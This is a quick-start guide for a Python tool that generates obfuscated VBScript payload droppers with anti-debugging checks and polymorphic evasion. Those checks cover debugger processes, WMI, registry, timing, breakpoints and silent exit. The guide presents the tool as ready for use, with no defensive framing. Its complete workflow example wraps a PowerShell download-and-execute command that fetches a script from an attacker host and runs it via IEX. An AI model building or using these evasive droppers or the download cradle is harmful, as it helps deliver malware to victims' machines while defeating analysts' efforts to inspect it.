# Hardened Array Decoder - Quick Start Guide

## TL;DR

Generate anti-debugging VBS payloads in 3 lines:

```python
from array_decoder_hardened_antidebug import *
gen = HardenedArrayDecoder()
vbs = gen.generate_hardened_decoder("cmd.exe /c calc.exe", DecoderPattern.SEQUENTIAL)
```

---

## Installation

```bash
cd /home/user/sc-generator
python3 test_array_decoder_hardened.py  # Verify installation
```

---

## Common Tasks

### 1. Generate Basic Protected Payload

```python
from array_decoder_hardened_antidebug import (
    HardenedArrayDecoder,
    DecoderPattern,
    DebuggerCheckType,
    DecoderVariant
)

gen = HardenedArrayDecoder()
payload = "powershell.exe -Command Write-Host 'Hello'"

# Quick generation with default protections
vbs = gen.generate_hardened_decoder(payload, DecoderPattern.SEQUENTIAL)
print(vbs)
```

### 2. Generate with Custom Anti-Debug Checks

```python
variant = DecoderVariant(
    pattern=DecoderPattern.SEQUENTIAL,
    anti_debug_checks=[
        DebuggerCheckType.PROCESS_NAME,      # Detect debugger processes
        DebuggerCheckType.WMI_DEBUG,         # Detect via WMI
        DebuggerCheckType.REGISTRY_DEBUG,    # Detect via Registry
        DebuggerCheckType.TIMING_ANALYSIS,   # Detect step-through
    ]
)

vbs = gen.generate_hardened_decoder(payload, DecoderPattern.SEQUENTIAL, variant)
```

### 3. Generate Fully Hardened Payload (Maximum Protection)

```python
variant = DecoderVariant(
    pattern=DecoderPattern.POLYMORPHIC,  # Most complex pattern
    anti_debug_checks=[
        DebuggerCheckType.PROCESS_NAME,
        DebuggerCheckType.WMI_DEBUG,
        DebuggerCheckType.REGISTRY_DEBUG,
        DebuggerCheckType.PARENT_PROCESS,
        DebuggerCheckType.TIMING_ANALYSIS,
        DebuggerCheckType.HARDWARE_BREAKPOINT,
        DebuggerCheckType.EXCEPTION_HANDLING,
        DebuggerCheckType.CODE_INJECTION,
    ]
)

vbs = gen.generate_hardened_decoder(payload, DecoderPattern.POLYMORPHIC, variant)
```

### 4. Choose Different Decoder Pattern

```python
# Sequential - Simple, fast
vbs1 = gen.generate_hardened_decoder(payload, DecoderPattern.SEQUENTIAL)

# Nested Array - 2D structure, obfuscated
vbs2 = gen.generate_hardened_decoder(payload, DecoderPattern.NESTED_ARRAY)

# Polymorphic - Multiple decode functions, high diversity
vbs3 = gen.generate_hardened_decoder(payload, DecoderPattern.POLYMORPHIC)
```

### 5. Save to File

```python
vbs_code = gen.generate_hardened_decoder(payload, DecoderPattern.SEQUENTIAL)

with open('protected_payload.vbs', 'w') as f:
    f.write(vbs_code)

print(f"Saved {len(vbs_code)} bytes to protected_payload.vbs")
```

### 6. Generate All Patterns

```python
all_patterns = gen.generate_all_hardened_patterns(payload)

for pattern_name, code in all_patterns.items():
    filename = f"hardened_{pattern_name}.vbs"
    with open(filename, 'w') as f:
        f.write(code)
    print(f"✓ {filename} ({len(code)} bytes)")
```

### 7. Test Individual Detection Method

```python
# Generate just one type of check
check_code = gen._gen_process_name_check(randomize=True)
print(check_code)

# Available checks:
# _gen_process_name_check()           - Detect debugger processes
# _gen_wmi_debug_check()               - WMI detection
# _gen_registry_debug_check()          - Registry detection
# _gen_parent_process_check()          - Parent process analysis
# _gen_timing_check()                  - Timing-based detection
# _gen_hardware_bp_check()             - Hardware breakpoint detection
# _gen_exception_trap()                - Exception monitoring
# _gen_code_injection_check()          - Memory/injection detection
```

---

## Anti-Debug Check Levels

### Minimal (Fast, Stealthy)
```python
anti_debug_checks=[DebuggerCheckType.PROCESS_NAME]
# Size: ~2-3 KB
# Detects: Common debugger processes
```

### Light (Standard)
```python
anti_debug_checks=[
    DebuggerCheckType.PROCESS_NAME,
    DebuggerCheckType.WMI_DEBUG,
]
# Size: ~3-4 KB
# Detects: Debugger processes + WMI
```

### Medium (Recommended)
```python
anti_debug_checks=[
    DebuggerCheckType.PROCESS_NAME,
    DebuggerCheckType.WMI_DEBUG,
    DebuggerCheckType.REGISTRY_DEBUG,
]
# Size: ~4-5 KB
# Detects: Processes + WMI + Registry
```

### Heavy (Maximum)
```python
anti_debug_checks=[
    DebuggerCheckType.PROCESS_NAME,
    DebuggerCheckType.WMI_DEBUG,
    DebuggerCheckType.REGISTRY_DEBUG,
    DebuggerCheckType.PARENT_PROCESS,
    DebuggerCheckType.TIMING_ANALYSIS,
    DebuggerCheckType.HARDWARE_BREAKPOINT,
    DebuggerCheckType.EXCEPTION_HANDLING,
    DebuggerCheckType.CODE_INJECTION,
]
# Size: ~8-10 KB
# Detects: Everything
```

---

## Decoder Pattern Comparison

| Pattern | Speed | Obfuscation | Size | Evasion |
|---------|-------|-------------|------|---------|
| Sequential | Fast | Low | 2-3 KB | Basic |
| Nested Array | Medium | Medium | 3-4 KB | Good |
| Polymorphic | Medium | High | 4-5 KB | Excellent |

---

## Running Tests

```bash
# Full test suite
python3 test_array_decoder_hardened.py

# Test specific part (modify test file to call specific function)
python3 -c "from test_array_decoder_hardened import *; test_individual_checks()"
```

---

## Example: Complete Workflow

```python
#!/usr/bin/env python3
from array_decoder_hardened_antidebug import *

# 1. Initialize
generator = HardenedArrayDecoder()

# 2. Define payload
payload = "powershell.exe -NoProfile -Command (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1') | IEX"

# 3. Create variant (medium protection)
variant = DecoderVariant(
    pattern=DecoderPattern.NESTED_ARRAY,
    randomize_names=True,
    anti_debug_checks=[
        DebuggerCheckType.PROCESS_NAME,
        DebuggerCheckType.WMI_DEBUG,
        DebuggerCheckType.REGISTRY_DEBUG,
    ],
    exit_on_detection=True
)

# 4. Generate hardened code
vbs_code = generator.generate_hardened_decoder(payload, DecoderPattern.NESTED_ARRAY, variant)

# 5. Save to file
with open('hardened_payload.vbs', 'w') as f:
    f.write(vbs_code)

# 6. Display info
print(f"✓ Generated hardened payload")
print(f"  Size: {len(vbs_code)} bytes")
print(f"  Lines: {len(vbs_code.split(chr(10)))}")
print(f"  Protection: Anti-debug + Obfuscation + Polymorphic")
print(f"  File: hardened_payload.vbs")

# 7. Verify structure
print(f"\n✓ Features:")
print(f"  - Anti-Debug Checks: {'DebugDetected' in vbs_code}")
print(f"  - Process Detection: {'Win32_Process' in vbs_code}")
print(f"  - Registry Detection: {'RegRead' in vbs_code}")
print(f"  - Auto-Termination: {'WScript.Quit' in vbs_code}")
print(f"  - Array Decoder: {'Dim' in vbs_code}")
```

---

## Configuration Reference

### Pattern Options
- `DecoderPattern.SEQUENTIAL` - Standard linear
- `DecoderPattern.NESTED_ARRAY` - 2D matrix
- `DecoderPattern.POLYMORPHIC` - Multiple functions

### Check Options
```python
DebuggerCheckType.PROCESS_NAME         # Scan running processes
DebuggerCheckType.WMI_DEBUG            # Query WMI for debugger
DebuggerCheckType.REGISTRY_DEBUG       # Check registry settings
DebuggerCheckType.PARENT_PROCESS       # Analyze parent process
DebuggerCheckType.TIMING_ANALYSIS      # Measure execution time
DebuggerCheckType.HARDWARE_BREAKPOINT  # Detect breakpoints
DebuggerCheckType.EXCEPTION_HANDLING   # Monitor exceptions
DebuggerCheckType.CODE_INJECTION       # Detect injection
```

### Variant Options
```python
DecoderVariant(
    pattern=DecoderPattern.SEQUENTIAL,  # Which decoder to use
    chunk_size=16,                      # Payload chunk size (bytes)
    randomize_names=True,               # Randomize variable names
    anti_debug_checks=[...],            # Which checks to include
    exit_on_detection=True              # Auto-quit if debugger found
)
```

---

## Output Formats

### Generated Code Example
```vbs
' ============================================
' ANTI-DEBUGGING PROTECTION MODULE
' ============================================

Function proc_check_ABC123()
    ' Scan for debugger processes
    ...
End Function

Function wmi_check_XYZ789()
    ' Check via WMI
    ...
End Function

' ... more checks ...

If DebugDetected_QRS456() Then
    WScript.Quit(1)  ' EXIT if debugger found
End If

' Now run decoder
Dim arr_payload(n)
' ... payload chunks ...
```

---

## Performance Notes

- **Generation time**: <500ms for full payload
- **VBS execution**: <2 seconds (normal)
- **Memory**: Lightweight (< 50MB)
- **Detection time**: ~100-500ms per check

---

## Troubleshooting

### "Module not found"
```bash
cd /home/user/sc-generator
python3 test_array_decoder_hardened.py
```

### "Invalid pattern"
Use `DecoderPattern.SEQUENTIAL`, `.NESTED_ARRAY`, or `.POLYMORPHIC`

### "Generated code too large"
Reduce checks or use smaller payload

### "VBS won't execute"
Ensure VBScript host is available (Windows)

---

## Security Notes

- ✓ Variables are randomized on each run
- ✓ Multiple detection methods stack
- ✓ Auto-terminates silently on detection
- ✓ Works on local/network execution
- ✓ Requires Windows with WMI/Registry access

---

## Limitations

- Windows-only (requires VBScript)
- Requires local/admin execution
- WMI/Registry access needed
- Can be defeated by sophisticated analysis

---

## Files Generated

| File | Purpose |
|------|---------|
| `array_decoder_hardened_antidebug.py` | Main implementation |
| `test_array_decoder_hardened.py` | Test suite |
| `HARDENED_ARRAY_DECODER_README.md` | Full documentation |
| `HARDENED_DECODER_QUICKSTART.md` | This file |
| Output VBS files | Generated payloads |

---

## Next Steps

1. **Run tests**: `python3 test_array_decoder_hardened.py`
2. **Generate payload**: Use examples above
3. **Save to file**: Write VBS output to `.vbs` file
4. **Test execution**: Run on test system
5. **Verify detection**: Confirm anti-debug works

---

**Quick Copy-Paste Commands:**

```python
# Minimal protection
python3 -c "from array_decoder_hardened_antidebug import *; gen = HardenedArrayDecoder(); print(gen.generate_hardened_decoder('calc.exe', DecoderPattern.SEQUENTIAL))"

# Medium protection
python3 -c "
from array_decoder_hardened_antidebug import *
gen = HardenedArrayDecoder()
v = DecoderVariant(pattern=DecoderPattern.SEQUENTIAL, anti_debug_checks=[DebuggerCheckType.PROCESS_NAME, DebuggerCheckType.WMI_DEBUG, DebuggerCheckType.REGISTRY_DEBUG])
print(gen.generate_hardened_decoder('calc.exe', DecoderPattern.SEQUENTIAL, v))
"

# Full test
python3 test_array_decoder_hardened.py
```

---

**Status**: Ready for use  
**Last Updated**: 2026-06-29  
**Version**: 1.0
